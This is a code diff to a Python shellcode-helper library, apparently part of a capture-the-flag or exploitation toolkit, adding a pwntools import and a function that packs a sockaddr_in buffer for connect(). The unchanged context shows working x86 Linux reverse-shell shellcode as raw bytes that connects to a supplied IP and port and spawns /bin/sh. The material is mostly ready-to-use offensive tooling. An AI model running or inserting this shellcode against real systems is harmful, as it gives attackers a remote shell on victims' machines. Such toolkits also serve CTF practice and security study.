@@ -9,6 +9,7 @@
 '''
 
 import sys
+from pwn import pack
 
 __all__ = [
     "ShellcodeMall",
@@ -151,6 +152,22 @@ class ShellcodeMall:
                 int_ip <<= 8
                 int_ip |= int(i)
             return b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"+int_ip.to_bytes(4, "big")+b"\x66\x68"+port.to_bytes(2, "big")+b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+
+    @staticmethod
+    def generate_payload_for_connect(ip: str, port: int) -> bytes:
+        """connect(socket_fd, buf, 0x10), generate payload of buf
+        
+        assert len(buf) == 0x10
+        
+        """
+        int_ip = 0
+        for i in ip.strip().split("."):
+            int_ip <<= 8
+            int_ip |= int(i)
+        
+        return pack(2, word_size=16, endianness="little") + pack(port, word_size=16, endianness="big") + pack(int_ip, word_size=32, endianness="big") + pack(0, 64)
+
 
 
 def shellcode2unicode(shellcode: str or bytes) -> str:
